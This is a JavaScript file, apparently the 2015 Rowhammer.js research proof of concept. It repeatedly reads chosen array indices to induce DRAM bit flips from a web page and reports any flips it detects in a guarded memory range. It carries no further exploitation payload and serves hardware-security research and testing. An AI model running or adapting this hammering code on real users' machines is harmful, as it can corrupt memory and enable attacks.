// Copyright 2015, Daniel Gruss, Clémentine Maurice
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
//     http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.
//

stop = 0;
function allocate()
{
  if (stop == 1)
    return;
  do
  {
    array[alloci] = alloci/4096;
    alloci += 4096;
  } while ((alloci % (2*1024*1024)) != 0);
  setTimeout(allocate, 50);
}
function start()
{
  if (stop == 1)
    return;
  setTimeout(allocate, 50);
}
function stopa()
{
  stop = 1;
}
function fillrandom()
{
  for (var i = 0; i < 63; i += 1)
  {
    array[f[i]] = Math.random()*256 | 0;
    array[s[i]] = Math.random()*256 | 0;
  }
}
function parseaddrs()
{
  stopa();
  
  offsets = document.getElementById("mapping").value.split("\n");
  for (var i = 0; i < 2; i++)
  {
    v[i] = parseInt(offsets[i],16);
  }
  for  (var i = v[0]; i <= v[1]; i++)
    array[i] = 255;
  var fidx = 0;
  var sidx = 0;
  for (var i = 2; i < 66; i++)
    f[fidx++] = parseInt(offsets[i],16);
  for (var i = 66; i < 130; i++)
    s[sidx++] = parseInt(offsets[i],16);
  fillrandom();
}

function check(sum)
{
  if (sum == 0)
    document.getElementById("text").innerHTML += "<br/>[!] sum is " + sum + "(should never happen)<br/>";
  var flip = 0;
  for  (var i = v[0]; i <= v[1]; i++) {
    if (array[i] != 255)
    {
      document.getElementById("text").innerHTML += "<br />[!] Found flip (" + array[i] + " != 255) at array index " + i + " when hammering indices " + f[0] + " and " + s[0] + "<br/>";
      array[i] = 255;
    }
  }
  fillrandom();
  if (flip == 0)
    setTimeout(hammer, 100);
}
function hammer()
{
  
  var sum = Math.random()*256 | 0;
  var number_of_reads = parseInt(document.getElementById("number_of_reads").value) | 0;
  if (number_of_reads == 0)
    return;
    
  var f0 = f[0] | 0;
  var s0 = s[0] | 0;

  var t0 = window.performance.now();
  while (number_of_reads-- > 0) {
    for (var i = 1; i < 34; i += 1) // you might have to vary 34 here, should be close to native code
    {
      sum += array[f[i]];
      sum += array[s[i]];
      sum += array[f[i+1]];
      sum += array[s[i+1]];
      sum += array[f[i]];
      sum += array[s[i]];
      sum += array[f[i+1]];
      sum += array[s[i+1]];
    }
    // simple eviction by filling a cache-sized memory buffer
    // slow, use only to check whether the histogram works and only for
    // a really small number of reads
    /*for (var i = 0; i < 8*1024*1024; i += 1)
    {
      sum += array[i];
    }*/
    //var t1 = window.performance.now();
    sum += array[f[0]];
    sum += array[s[0]];
    //var t2 = window.performance.now();
/*   array[f0] += 1;
    array[s0] += 1;*/


    // because the above ones are commented out
    var t1 = 0;
    var t2 = 0;
    
    
    // we found that some useless instructions increase the number of bitflips
    // you can try to comment the following code out
    if (Math.round((t2 - t1) * 100000.0,0) > 42)
      hist[42] += 1;
    else if (hist[Math.round((t2 - t1) * 100000.0,0)] > 0)
      hist[Math.round((t2 - t1) * 100000.0,0)] += 1;
    else
      hist[Math.round((t2 - t1) * 100000.0,0)] = 1;
  }
  var t2 = window.performance.now();

// histogram code is commented out
/*  document.getElementById("text").innerHTML = "";
  document.getElementById("text").innerHTML += sum + "<br />";
  document.getElementById("text").innerHTML += array[f[0]] + "<br />";
  document.getElementById("text").innerHTML += v[0] + "<br />";
  document.getElementById("text").innerHTML += f[0] + "<br />";
  document.getElementById("text").innerHTML += s[0] + "<br />";
  for (var i = 0; i < 43; i++)
    document.getElementById("text").innerHTML += i + "0: " + hist[i] + "<br />";
  hist = Array(0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0);
*/
  document.getElementById("text").innerHTML += " " + Math.round((t2 - t0) * 1000000.0/parseInt(document.getElementById("number_of_reads").value),0);
  check(sum);
}
document.getElementById("text").innerHTML = "";

